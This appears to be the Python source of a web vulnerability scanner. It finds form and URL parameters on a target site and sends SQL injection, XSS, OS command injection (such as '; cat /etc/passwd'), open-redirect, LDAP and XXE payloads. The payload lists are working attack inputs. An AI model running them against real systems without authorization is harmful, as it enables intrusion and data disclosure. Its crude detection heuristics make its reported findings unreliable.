import requests
import time
import urllib.parse
from bs4 import BeautifulSoup
import re
from concurrent.futures import ThreadPoolExecutor
import random

class VulnerabilityChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SecurityScanner/1.0 (Vulnerability Assessment)'
        })
        self.timeout = 5  # Keep reduced timeout for individual requests

    def _try_both_protocols(self, url):
        """Try both HTTP and HTTPS if one fails"""
        urls_to_try = []

        if url.startswith('https://'):
            urls_to_try = [url, url.replace('https://', 'http://')]
        elif url.startswith('http://'):
            urls_to_try = [url.replace('http://', 'https://'), url]
        else:
            # No protocol specified, try HTTPS first then HTTP
            urls_to_try = [f'https://{url}', f'http://{url}']

        for test_url in urls_to_try:
            try:
                response = self.session.get(test_url, timeout=self.timeout)
                if response.status_code == 200:
                    return response, test_url
            except Exception as e:
                print(f"Failed to connect to {test_url}: {e}")
                continue

        # If both fail, raise the last exception
        raise requests.exceptions.ConnectionError(f"Could not connect to {url} via HTTP or HTTPS")

    def scan(self, url):
        """Main scan method that orchestrates all vulnerability checks"""
        findings = []

        try:
            print(f"[DEBUG] Starting comprehensive vulnerability scan for: {url}")

            # Step 1: Discover injection points
            injection_points = self.discover_injection_points(url)
            print(f"[DEBUG] Found {len(injection_points)} injection points")

            # Step 2: Run comprehensive vulnerability checks
            print("[DEBUG] Starting comprehensive SQL injection tests...")
            sql_findings = self.check_sql_injection(url, injection_points)
            findings.extend(sql_findings)
            print(f"[DEBUG] SQL injection tests completed: {len(sql_findings)} findings")

            print("[DEBUG] Starting comprehensive XSS tests...")
            xss_findings = self.check_xss_vulnerabilities(url, injection_points)
            findings.extend(xss_findings)
            print(f"[DEBUG] XSS tests completed: {len(xss_findings)} findings")

            print("[DEBUG] Starting comprehensive command injection tests...")
            cmd_findings = self.check_command_injection(url, injection_points)
            findings.extend(cmd_findings)
            print(f"[DEBUG] Command injection tests completed: {len(cmd_findings)} findings")

            print("[DEBUG] Starting comprehensive open redirect tests...")
            redirect_findings = self.check_open_redirect(url, injection_points)
            findings.extend(redirect_findings)
            print(f"[DEBUG] Open redirect tests completed: {len(redirect_findings)} findings")

            print("[DEBUG] Starting LDAP injection tests...")
            ldap_findings = self.check_ldap_injection(url, injection_points)
            findings.extend(ldap_findings)
            print(f"[DEBUG] LDAP injection tests completed: {len(ldap_findings)} findings")

            print("[DEBUG] Starting XML injection tests...")
            xml_findings = self.check_xml_injection(url, injection_points)
            findings.extend(xml_findings)
            print(f"[DEBUG] XML injection tests completed: {len(xml_findings)} findings")

        except Exception as e:
            print(f"[ERROR] Vulnerability scan error: {e}")
            findings.append({
                'severity': 'Info',
                'title': 'Vulnerability scan error',
                'description': f'Error during vulnerability scanning: {str(e)}'
            })

        # Always return at least one finding for debugging
        if not findings:
            findings.append({
                'severity': 'Info',
                'title': 'No Vulnerabilities Detected',
                'description': f'No vulnerabilities found during comprehensive scan of {url}. This could mean the site is secure or uses advanced protection.'
            })

        print(f"[DEBUG] Total comprehensive vulnerability findings: {len(findings)}")
        return findings

    def discover_injection_points(self, url):
        """Discover potential injection points by finding links with parameters and forms"""
        injection_points = []

        try:
            response, working_url = self._try_both_protocols(url)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Find links with parameters
            for link in soup.find_all('a', href=True):
                href = link['href']
                if '?' in href:
                    full_url = urllib.parse.urljoin(working_url, href)
                    parsed = urllib.parse.urlparse(full_url)
                    params = urllib.parse.parse_qs(parsed.query)

                    for param in params.keys():
                        injection_points.append({
                            'type': 'GET',
                            'url': full_url,
                            'parameter': param
                        })

            # Find forms
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'GET').upper()
                form_url = urllib.parse.urljoin(working_url, action)

                for input_field in form.find_all(['input', 'textarea', 'select']):
                    name = input_field.get('name')
                    if name:
                        injection_points.append({
                            'type': method,
                            'url': form_url,
                            'parameter': name,
                            'form': True
                        })

            # If no injection points found, test common parameters on the main URL
            if not injection_points:
                common_params = ['id', 'page', 'search', 'q', 'user', 'category', 'item', 'name', 'value', 'data', 'input']
                for param in common_params:
                    injection_points.append({
                        'type': 'GET',
                        'url': working_url,
                        'parameter': param
                    })

        except Exception as e:
            print(f"[ERROR] Error discovering injection points: {e}")

        return injection_points[:15]  # Increased to 15 points for more comprehensive testing

    def check_sql_injection(self, base_url, injection_points):
        """Check for SQL injection vulnerabilities using comprehensive techniques"""
        findings = []

        if not injection_points:
            return findings

        # Comprehensive SQL injection payloads
        sql_payloads = {
            'error_based': [
                "'", "\'", "\ ", '""', "';--", "' OR '1'='1'", 
                "' AND 1=0--", "' AND '1'='2", "admin'--", "admin'#",
                "' OR 1=1#", "' OR 1=1/*", "') OR ('1'='1",
                "' OR 1=1 UNION SELECT NULL--", "' HAVING 1=1--",
                "' GROUP BY columnnames HAVING 1=1--", "' ORDER BY 1--",
                "\x27 OR 1=1--", "\x27 AND 1=0--"
            ],
            'boolean_based': [
                "' OR 1=1 --", "' OR 'a'='a", " OR 1=1 --", "') OR ('1'='1",
                "' OR '1'='1' AND '1'='1", "' OR 1=1 AND 'test'='test",
                "admin' AND '1'='1'--", "admin' AND '1'='2'--",
                "' OR 'x'='x", "' OR 2>1--", "' OR 'something' LIKE 's%",
                "') OR 1=1--", "' OR 1=1 LIMIT 1--", "' OR 'a'='a' #"
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:03'--", "' OR SLEEP(3)--", "'; SELECT SLEEP(3)--",
                "' AND SLEEP(3)--", "'; WAITFOR TIME '00:00:03'--",
                "' OR IF(1=1,SLEEP(3),0)--", "'; IF(1=1) WAITFOR DELAY '00:00:03'--",
                "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)--",
                "' OR BENCHMARK(10000000,MD5(1))--", "'; pg_sleep(3)--",
                "' AND (SELECT pg_sleep(3))--", "' OR (SELECT SLEEP(3) FROM DUAL)--"
            ],
            'union_based': [
                "' UNION SELECT NULL--", "' UNION ALL SELECT NULL--",
                "' UNION SELECT NULL, NULL--", "' UNION ALL SELECT NULL, NULL--",
                "' UNION SELECT 1,2,3--", "' UNION ALL SELECT 1,2,3,4--",
                "') UNION SELECT NULL--", "' UNION SELECT user()--",
                "' UNION SELECT version()--", "' UNION SELECT database()--"
            ]
        }

        for point in injection_points[:8]:  # Test more points
            try:
                print(f"[DEBUG] Testing comprehensive SQL injection on parameter: {point['parameter']}")
                original_response = self._make_request(point, "normal_value")

                # Test Error-based SQL Injection
                for payload in sql_payloads['error_based'][:10]:  # More payloads
                    try:
                        response = self._make_request(point, payload)
                        if self._detect_sql_errors(response.text):
                            findings.append({
                                'severity': 'Critical',
                                'title': 'SQL Injection - Error-based',
                                'description': f'Error-based SQL injection detected in parameter "{point["parameter"]}" using payload: {payload}'
                            })
                            break
                    except Exception as e:
                        print(f"[DEBUG] Error testing SQL payload {payload}: {e}")
                        continue

                # Test Boolean-based SQL Injection
                for payload in sql_payloads['boolean_based'][:8]:
                    try:
                        response = self._make_request(point, payload)
                        if abs(len(response.text) - len(original_response.text)) > 50:  # More sensitive threshold
                            findings.append({
                                'severity': 'Critical',
                                'title': 'SQL Injection - Boolean-based',
                                'description': f'Boolean-based SQL injection detected in parameter "{point["parameter"]}" - response differs with payload: {payload}'
                            })
                            break
                    except Exception as e:
                        print(f"[DEBUG] Error testing boolean SQL payload {payload}: {e}")
                        continue

                # Test Union-based SQL Injection
                for payload in sql_payloads['union_based'][:6]:
                    try:
                        response = self._make_request(point, payload)
                        if self._detect_union_injection(response.text, original_response.text):
                            findings.append({
                                'severity': 'Critical',
                                'title': 'SQL Injection - Union-based',
                                'description': f'Union-based SQL injection detected in parameter "{point["parameter"]}" - UNION query executed successfully'
                            })
                            break
                    except Exception as e:
                        print(f"[DEBUG] Error testing union SQL payload {payload}: {e}")
                        continue

                # Test Time-based SQL Injection
                for payload in sql_payloads['time_based'][:4]:
                    try:
                        start_time = time.time()
                        response = self._make_request(point, payload)
                        elapsed_time = time.time() - start_time

                        if elapsed_time > 2.5:
                            findings.append({
                                'severity': 'Critical',
                                'title': 'SQL Injection - Time-based',
                                'description': f'Time-based SQL injection detected in parameter "{point["parameter"]}" - response delayed by {elapsed_time:.2f} seconds'
                            })
                            break
                    except Exception as e:
                        print(f"[DEBUG] Error testing time-based SQL payload {payload}: {e}")
                        continue

            except Exception as e:
                print(f"[DEBUG] Error testing SQL injection on point {point}: {e}")
                continue

        return findings

    def check_xss_vulnerabilities(self, base_url, injection_points):
        """Check for Cross-Site Scripting vulnerabilities with comprehensive payloads"""
        findings = []

        # Comprehensive XSS payloads
        xss_payloads = [
            # Basic script injections
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            '<script>alert(String.fromCharCode(88,83,83))</script>',

            # Event handler injections
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            '''<iframe src="javascript:alert('XSS')"></iframe>''',

            # Advanced bypass techniques
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
            'javascript:alert("XSS")',
            '''<img src="javascript:alert('XSS')"''',
            '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=">',

            # Filter bypass attempts
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<<SCRIPT>alert("XSS");//<</SCRIPT>',
            '<script\x20type="text/javascript">alert("XSS");</script>',
            '<script\x09type="text/javascript">alert("XSS");</script>',

            # HTML5 vectors
            '<input autofocus onfocus=alert("XSS")>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<keygen onfocus=alert("XSS") autofocus>',

            # CSS injection
            '''<style>@import"javascript:alert('XSS')";</style>''',
            '''<link rel="stylesheet" href="javascript:alert('XSS')">''',

            # Other vectors
            '<marquee onstart=alert("XSS")>',
            '''<video><source onerror="alert('XSS')">''',
            '<audio src=x onerror=alert("XSS")>'
        ]

        for point in injection_points[:8]:
            try:
                print(f"[DEBUG] Testing comprehensive XSS on parameter: {point['parameter']}")
                for payload in xss_payloads:
                    response = self._make_request(point, payload)

                    # Check if payload is reflected in response
                    if payload in response.text or payload.replace('"', "'") in response.text:
                        # Check if it's properly escaped
                        if not self._is_xss_escaped(response.text, payload):
                            findings.append({
                                'severity': 'High',
                                'title': 'Cross-Site Scripting (XSS)',
                                'description': f'Reflected XSS vulnerability found in parameter "{point["parameter"]}" - payload "{payload[:50]}..." reflected without proper escaping'
                            })
                            break

            except Exception as e:
                print(f"[DEBUG] Error testing XSS on point {point}: {e}")
                continue

        return findings

    def check_command_injection(self, base_url, injection_points):
        """Check for OS command injection vulnerabilities with comprehensive payloads"""
        findings = []

        # Comprehensive command injection payloads
        command_payloads = [
            # Linux/Unix commands
            '; ls -la', '| ls -la', '&& ls -la', '`ls -la`', '$(ls -la)',
            '; whoami', '| whoami', '&& whoami', '`whoami`', '$(whoami)',
            '; id', '| id', '&& id', '`id`', '$(id)',
            '; uname -a', '| uname -a', '&& uname -a',
            '; cat /etc/passwd', '| cat /etc/passwd', '&& cat /etc/passwd',
            '; ps aux', '| ps aux', '&& ps aux',

            # Windows commands
            '& dir', '&& dir', '| dir', '; dir',
            '& whoami', '&& whoami', '| whoami', '; whoami',
            '& ver', '&& ver', '| ver', '; ver',
            '& net user', '&& net user', '| net user',

            # Network commands
            '; ping -c 1 127.0.0.1', '| ping -c 1 127.0.0.1', '&& ping -c 1 127.0.0.1',
            '; nslookup google.com', '| nslookup google.com', '&& nslookup google.com',

            # Time delay commands for blind injection
            '; sleep 3', '&& sleep 3', '| sleep 3',
            '& ping -n 3 127.0.0.1', '&& ping -n 3 127.0.0.1',
        ]

        for point in injection_points[:6]:
            try:
                print(f"[DEBUG] Testing comprehensive command injection on parameter: {point['parameter']}")
                for payload in command_payloads:
                    response = self._make_request(point, payload)

                    # Look for command output indicators
                    if self._detect_command_output(response.text):
                        findings.append({
                            'severity': 'Critical',
                            'title': 'OS Command Injection',
                            'description': f'Command injection vulnerability detected in parameter "{point["parameter"]}" using payload "{payload}" - system command output found in response'
                        })
                        break

            except Exception as e:
                print(f"[DEBUG] Error testing command injection on point {point}: {e}")
                continue

        return findings

    def check_open_redirect(self, base_url, injection_points):
        """Check for open redirect vulnerabilities with comprehensive payloads"""
        findings = []

        # Comprehensive open redirect payloads
        redirect_payloads = [
            # Basic redirects
            'http://evil.com',
            'https://malicious.site',
            '//evil.com',
            '///evil.com',

            # Protocol relative
            '//google.com',
            '\\evil.com',

            # JavaScript redirects
            'javascript:alert("redirect")',
            'javascript:window.location="http://evil.com"',

            # Data URIs
            'data:text/html,<script>alert("redirect")</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgncmVkaXJlY3QnKTwvc2NyaXB0Pg==',

            # Bypass attempts
            'http:/evil.com',
            'https:/evil.com',
            'http:\\evil.com',
            'https:\\evil.com',

            # Mixed case
            'HTTP://EVIL.COM',
            'HTTPS://EVIL.COM',

            # URL encoding
            'http%3A//evil.com',
            'https%3A//evil.com',
            '%2F%2Fevil.com',
        ]

        for point in injection_points[:6]:
            try:
                print(f"[DEBUG] Testing comprehensive open redirect on parameter: {point['parameter']}")
                for payload in redirect_payloads:
                    response = self._make_request(point, payload, allow_redirects=False)

                    # Check for redirect responses
                    if response.status_code in [301, 302, 307, 308]:
                        location = response.headers.get('Location', '')
                        if any(domain in location.lower() for domain in ['evil.com', 'malicious.site', 'google.com']) or 'javascript:' in location:
                            findings.append({
                                'severity': 'Medium',
                                'title': 'Open Redirect',
                                'description': f'Open redirect vulnerability found in parameter "{point["parameter"]}" - redirects to external location: {location}'
                            })
                            break

            except Exception as e:
                print(f"[DEBUG] Error testing open redirect on point {point}: {e}")
                continue

        return findings

    def check_ldap_injection(self, base_url, injection_points):
        """Check for LDAP injection vulnerabilities"""
        findings = []

        ldap_payloads = [
            '*', '*)(&', '*))%00', "()|%26'" ,
            '*)(uid=*', '*)(|(uid=*', '*)(|(objectClass=*',
            'admin*', 'admin*)((|userPassword=*',
            '*))(|(cn=*', '*)(|(mail=*', '*)(|(sn=*'
        ]

        for point in injection_points[:4]:
            try:
                print(f"[DEBUG] Testing LDAP injection on parameter: {point['parameter']}")
                for payload in ldap_payloads:
                    response = self._make_request(point, payload)

                    if self._detect_ldap_errors(response.text):
                        findings.append({
                            'severity': 'High',
                            'title': 'LDAP Injection',
                            'description': f'LDAP injection vulnerability detected in parameter "{point["parameter"]}" - LDAP error messages found'
                        })
                        break

            except Exception as e:
                print(f"[DEBUG] Error testing LDAP injection on point {point}: {e}")
                continue

        return findings

    def check_xml_injection(self, base_url, injection_points):
        """Check for XML injection vulnerabilities"""
        findings = []

        xml_payloads = [
            '<xml>test</xml>',
            '<?xml version="1.0"?><test>data</test>',
            '<![CDATA[test]]>',
            '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
            '<test xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></test>'
        ]

        for point in injection_points[:3]:
            try:
                print(f"[DEBUG] Testing XML injection on parameter: {point['parameter']}")
                for payload in xml_payloads:
                    response = self._make_request(point, payload)

                    if self._detect_xml_errors(response.text) or 'root:x:' in response.text:
                        findings.append({
                            'severity': 'High',
                            'title': 'XML Injection / XXE',
                            'description': f'XML injection vulnerability detected in parameter "{point["parameter"]}" - XML processing errors or file disclosure detected'
                        })
                        break

            except Exception as e:
                print(f"[DEBUG] Error testing XML injection on point {point}: {e}")
                continue

        return findings

    def _make_request(self, injection_point, payload, allow_redirects=True):
        """Make HTTP request with payload and protocol fallback"""
        try:
            if injection_point['type'] == 'GET':
                parsed_url = urllib.parse.urlparse(injection_point['url'])
                params = urllib.parse.parse_qs(parsed_url.query)
                params[injection_point['parameter']] = [payload]

                new_query = urllib.parse.urlencode(params, doseq=True)
                new_url = urllib.parse.urlunparse((
                    parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                    parsed_url.params, new_query, parsed_url.fragment
                ))

                return self.session.get(new_url, timeout=self.timeout, allow_redirects=allow_redirects)

            else:  # POST request
                data = {injection_point['parameter']: payload}
                return self.session.post(injection_point['url'], data=data, timeout=self.timeout, allow_redirects=allow_redirects)

        except requests.exceptions.ConnectionError:
            # Try alternate protocol
            alt_url = injection_point['url']
            if alt_url.startswith('https://'):
                alt_url = alt_url.replace('https://', 'http://')
            else:
                alt_url = alt_url.replace('http://', 'https://')

            if injection_point['type'] == 'GET':
                parsed_url = urllib.parse.urlparse(alt_url)
                params = urllib.parse.parse_qs(parsed_url.query)
                params[injection_point['parameter']] = [payload]

                new_query = urllib.parse.urlencode(params, doseq=True)
                new_url = urllib.parse.urlunparse((
                    parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                    parsed_url.params, new_query, parsed_url.fragment
                ))

                return self.session.get(new_url, timeout=self.timeout, allow_redirects=allow_redirects)
            else:
                data = {injection_point['parameter']: payload}
                return self.session.post(alt_url, data=data, timeout=self.timeout, allow_redirects=allow_redirects)

    def _detect_sql_errors(self, response_text):
        """Enhanced SQL error detection patterns"""
        sql_errors = [
            # MySQL
            'sql syntax', 'mysql_fetch', 'mysql_num_rows', 'mysql error', 'warning: mysql_',
            'valid mysql result', 'mysqlclient.', 'com.mysql.jdbc', 'mysql_query()', 'mysql_error()',

            # PostgreSQL
            'postgresql query failed', 'pg_query()', 'pg_exec()', 'postgresql error',
            'warning: pg_', 'psql:', 'column does not exist', 'relation does not exist',

            # Microsoft SQL Server
            'microsoft ole db', 'sqlserver jdbc', 'com.microsoft.sqlserver.jdbc',
            'odbc sql server driver', '[sql server]', 'unclosed quotation mark',
            'incorrect syntax near', 'conversion failed', 'invalid column name',

            # Oracle
            'ora-', 'oracle error', 'oracle.jdbc', 'quoted string not properly terminated',

            # SQLite
            'sqlite/jdbcdriver', 'sqlite3::', 'sqlite error', 'no such table',
            'no such column', 'sqlite_', 'database is locked',

            # Generic
            'database error', 'sql error', 'syntax error', 'quoted string not properly terminated',
            'sqlexception', 'database exception', 'prepare failed', 'statement failed'
        ]

        response_lower = response_text.lower()
        return any(error.lower() in response_lower for error in sql_errors)

    def _detect_union_injection(self, response_text, original_text):
        """Detect successful UNION injection"""
        # Look for typical UNION injection indicators
        union_indicators = [
            'null', 'information_schema', 'mysql', 'version()',
            'database()', 'user()', 'current_user', '@@version'
        ]

        # Check if new content appeared that wasn't in original
        response_lower = response_text.lower()
        original_lower = original_text.lower()

        for indicator in union_indicators:
            if indicator in response_lower and indicator not in original_lower:
                return True

        # Check for significant content increase (typical of UNION dumps)
        if len(response_text) > len(original_text) * 1.5:
            return True

        return False

    def _is_xss_escaped(self, response_text, payload):
        """Enhanced XSS escaping detection"""
        escaped_chars = [
            '&lt;', '&gt;', '&quot;', '&#x27;', '&#x2F;', '&amp;',
            '\x3C', '\x3E', '\x22', '\x27', '\x2F',
            '&lcub;', '&rcub;', '&#40;', '&#41;'
        ]
        return any(escaped in response_text for escaped in escaped_chars)

    def _detect_command_output(self, response_text):
        """Enhanced command output detection"""
        command_indicators = [
            # Linux/Unix indicators
            'root:x:', 'bin/bash', 'drwxr-xr-x', 'total ', 'usr/bin',
            'uid=', 'gid=', 'groups=', '/etc/passwd', '/home/',
            'linux', 'gnu/', 'kernel', 'ubuntu', 'debian', 'centos',

            # Network command output
            'ping ', 'bytes from', 'packets transmitted', 'ping statistics',
            'nslookup', 'non-authoritative answer',

            # Windows indicators
            'directory of', 'volume in drive', '<dir>', 'bytes free',
            'windows nt', 'microsoft windows', 'c:\\', 'system32',

            # Process indicators
            'pid', 'ppid', 'process', 'cmd.exe', 'powershell',

            # File system
            'permission denied', 'no such file', 'cannot access'
        ]

        response_lower = response_text.lower()
        return any(indicator in response_lower for indicator in command_indicators)

    def _detect_ldap_errors(self, response_text):
        """Detect LDAP error patterns"""
        ldap_errors = [
            'ldap error', 'invalid dn syntax', 'ldap search failed',
            'naming exception', 'javax.naming', 'ldap:', 'directory server',
            'active directory', 'ldap bind failed', 'ldap connection'
        ]

        response_lower = response_text.lower()
        return any(error in response_lower for error in ldap_errors)

    def _detect_xml_errors(self, response_text):
        """Detect XML parsing errors"""
        xml_errors = [
            'xml parse error', 'malformed xml', 'xml syntax error',
            'sax parse exception', 'document type declaration', 'xml version',
            'parsing error', 'unexpected token', 'unclosed token',
            'xml document', 'xmlns:', 'entity'
        ]

        response_lower = response_text.lower()
        return any(error in response_lower for error in xml_errors)
